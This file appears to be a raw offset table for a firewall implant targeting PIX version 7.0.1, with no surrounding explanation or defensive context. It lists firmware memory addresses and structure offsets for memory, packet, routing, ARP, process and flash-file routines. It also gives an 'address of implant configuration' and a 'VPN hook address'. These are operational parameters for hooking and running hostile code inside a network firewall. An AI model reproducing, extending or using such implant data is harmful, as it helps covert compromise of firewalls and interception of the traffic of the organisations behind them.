; --- SECTION I ---
;
0x701            // pix version
0x4e1800              // address of implant configuration
0x0   0x008d6e94      // allocb
0x1   0x008d7280      // freeb
0x2   0x00110368      // open
0x3   0x0047f670      // ip_put
0x4   0x0011046c      // close
0x5   0x00b8d928      // atoip
0x6   0x00b7b1d8      // memset
0x7   0x00b97a6c      // memmove
0x8   0x008d6b70      // malloc_call_calloc
0x9   0x00b8319c      // free
0xa   0x00b7d0f4      // printf
0xb   0x00000014      // interface offset in metaframe
0xc   0x00000010      // offset for vlan number in interface struct
0xd   0x00000060      // metaframe offset in block structure
0xe   0x00000074      // interface semiphore in metaframe
0xf   0x00b978c0      // rand
0x15  0x0010dbec      // process_create
0x16  0x0010ea9c      // process_suspend
0x17  0x0010f4e0      // process_sleep_for
0x18  0x006f8ab0      // show_process
0x19  0x0000001c      // offset to security level in int_struct
0x1a  0x00db4510      // cur_t
0x1b  0x04      // channel offset in interface struct
0x1c  0x0c      // PUT offset in channel struct
0x1d  0x24      // offset to dest mac in arp structure
0x1e  0x00      // offset to next hop ip in route structure
0x1f  0x10      // size of route struct
0x20  0x00482ea4      // calc_ip_cksum
0x21  0x00484664      // arp_loopkup
0x22  0x00483434      // set_block_hdr_mac_and_proto
0x23  0x00494048      // get hardware interface
0x24  0x00a4eba0      // get next hop
0x25  0x00a53078      // get route
0x26  0x00481604      // send_it
0x27  0x00486784      // arp_create
0x28  0x0074148c      // get_hw_iface_2
0x2a  0x44      // pointer to ethernet frame
0x2b  0x3c            // wptr structure offset
0x2c  0x24            // inIfc (incoming interface) structure offset
0x2d  0x005f72f4      // VPN hook address
0x2e  0x188      // offset from cur_t that contains the current context number
0x2f  0x00d5b8f8      // pointer to channnel list
0x30  0x00c866ac      // address of NIC database
0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
0x32  0x00000020      // offset to IP address in int_struct
0x33  0x00000018      // iface struct adjust from metaframe
0x34  0x00d43da4      // max number of interface cards
0x35  0x00db3cf0      // internal_clock
0x36  0x0074040c      // get_interface_mac
0x37  0x00000143      // offset to hardware interface number in interface struct
0x38  0x4c      // offset to ip in route structure
0x39  0x68      // offset to interface num in route structure
0x3a  0x41c      // offset to send channel in channel list
0x3b  0x003e7910      // ifs_read; flash file read routine -- IFS: Read:
0x3c  0x003e79b0      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x003e7428      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x003e7824      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x20        // offset in block to next IP fragment ptr 
0x40  0x00dccc90      // address of context list
